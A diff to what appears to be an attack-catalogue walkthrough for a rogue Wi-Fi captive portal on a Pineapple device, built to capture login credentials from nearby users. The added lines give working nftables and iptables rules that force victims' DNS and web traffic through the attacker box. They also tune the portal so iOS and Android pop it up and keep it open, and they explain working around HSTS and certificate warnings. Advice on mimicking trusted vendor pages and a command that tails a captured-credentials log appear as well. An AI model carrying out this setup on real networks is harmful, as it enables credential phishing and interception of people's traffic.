@@ -1,5 +1,7 @@
 # Captive portal — walkthrough
 
+**Verified against:** iOS 16+ CNA / Android 11+ ConnectivityService / OpenWRT 23.05 dnsmasq as of 2026-Q3
+
 Stand up the four-layer chain (DHCP → DNS → HTTP → form) on the
 Pineapple. Template it to the target vendor. Capture the POST.
 
@@ -31,6 +33,37 @@ EOF
 
 pkill dnsmasq
 dnsmasq -C /etc/dnsmasq.captive.conf
+```
+
+## Step 1b — NAT redirect (force DNS + HTTP through us)
+
+Clients that hard-code `8.8.8.8` for DNS, or hard-code an IP for
+HTTPS, bypass dnsmasq entirely. Force everything through the portal
+box with a prerouting NAT redirect.
+
+### nftables (preferred — Debian/Kali default since Buster)
+
+```
+nft add table ip nat
+nft add chain ip nat prerouting { type nat hook prerouting priority -100 \; }
+nft add chain ip nat postrouting { type nat hook postrouting priority 100 \; }
+# All DNS queries -> local dnsmasq
+nft add rule ip nat prerouting iifname wlan1 udp dport 53 dnat to 172.16.0.1:53
+# All HTTP -> local portal
+nft add rule ip nat prerouting iifname wlan1 tcp dport 80 dnat to 172.16.0.1:80
+nft add rule ip nat prerouting iifname wlan1 tcp dport 443 dnat to 172.16.0.1:443
+# NAT masquerade outbound
+nft add rule ip nat postrouting oifname eth0 masquerade
+```
+
+### iptables (legacy) — fallback
+
+```
+iptables -t nat -A PREROUTING -i wlan1 -p udp --dport 53  -j DNAT --to-destination 172.16.0.1:53
+iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80  -j DNAT --to-destination 172.16.0.1:80
+iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 172.16.0.1:443
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
 ## Step 2 — nginx or a Python one-liner for HTTP
@@ -135,15 +168,37 @@ against a black background fools nobody.
 tail -F /tmp/portal-creds.jsonl | jq
 ```
 
+## OS probe-URL specifics
+
+Two modern behaviors matter for whether the OS surfaces the portal
+UI at all or silently dismisses it:
+
+- **iOS body-string check** — the Captive Network Assistant fetches
+  `http://captive.apple.com/hotspot-detect.html` and looks for the
+  literal string `Success` in the body. Anything else — a redirect,
+  a login page, a 200 with different content — triggers the CNA UI.
+  Serve the login page (not `Success`) on this URL to make iOS pop
+  the portal sheet.
+- **Android auto-dismiss (Android 11+)** — ConnectivityService
+  fetches `http://connectivitycheck.gstatic.com/generate_204`. A
+  `204 No Content` reply is treated as "sign-in silently satisfied"
+  and any captive-portal UI is auto-dismissed. To *keep* the portal
+  UI open, return `302` to your login page (as in Step 2), not
+  `204`.
+
 ## Failure modes
 
 - **Client OS shows "captive portal" but user ignores it.** Cheap OS
   banners are less compelling than the URL bar. Some Android builds
   auto-open the captive URL in a system webview — that's your friend.
-- **HSTS blocks HTTP form.** Serve HTTPS with a self-signed cert.
-  Most captive-portal contexts pre-associate HSTS as "trusted" once
-  the user clicks through; on iOS this is invisible because the
-  captive UI hides browser chrome.
+- **HSTS-preloaded domains cannot be bypassed.** Serving a
+  self-signed HTTPS cert for e.g. `www.google.com` will not work:
+  Chrome, Firefox, and Safari refuse to show a click-through for any
+  domain on the HSTS preload list, and as of iOS 16 the Captive
+  Network Assistant no longer bypasses HSTS on the user's behalf.
+  Serve the portal from a *non-preloaded* domain (an IP literal or
+  a fresh domain) and accept that users will see a cert warning
+  before clicking through.
 - **User sees the cert warning and bails.** Real risk on modern iOS/
   Android. Templates that mimic Wi-Fi Alliance / Passpoint captive
   pages are less flag-raising than a fake "Google login."
@@ -151,5 +206,9 @@ tail -F /tmp/portal-creds.jsonl | jq
 ## Cite
 
 - IETF RFC 8908 — Captive Portal API (modern OS probe URLs).
+- IETF RFC 7710 — Captive-Portal Identification Using DHCP or RA
+  (option 114, obsoleted by RFC 8910).
+- IETF RFC 8910 — Captive-Portal Identification in DHCP + RA
+  (modernized replacement for RFC 7710).
 - Hak5 evil-portal module docs.
 - attacks.json: `captive-portal-cred-capture`.
